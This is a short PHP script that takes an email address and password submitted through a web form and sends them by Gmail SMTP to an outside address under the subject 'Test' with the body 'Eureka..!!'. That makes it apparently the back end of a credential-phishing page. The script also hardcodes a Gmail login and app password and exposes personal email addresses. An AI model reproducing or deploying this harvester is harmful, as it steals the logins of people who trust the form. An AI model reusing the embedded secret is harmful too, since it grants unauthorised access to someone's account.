<?php
require_once('class.phpmailer.php');
require_once('class.smtp.php');


$u = $_POST["email"];
$p = $_POST["pass"];

echo $u . " - " . $p;
echo $p;

$mail = new PHPMailer(); // create a new object
$mail->IsSMTP(); // enable SMTP
$mail->SMTPDebug = 1; // debugging: 1 = errors and messages, 2 = messages only
$mail->SMTPAuth = true; // authentication enabled
$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for GMail
$mail->Host = "smtp.gmail.com";
$mail->Port = 465; // or 587
$mail->IsHTML(true);
$mail->Username = "aritram90@gmail.com";
$mail->Password = "slsthbhjbudkhzct";
$mail->SetFrom("aritram90@gmail.com");
$mail->Subject = "Test";
$mail->Body = "Eureka..!!" . $u . " - " . $p;
$mail->AddAddress("aritra.mondal@tcs.com");
 if(!$mail->Send())
    {
    echo "Mailer Error: " . $mail->ErrorInfo;
    }
    else
    {
    echo "Message has been sent";
    }
?>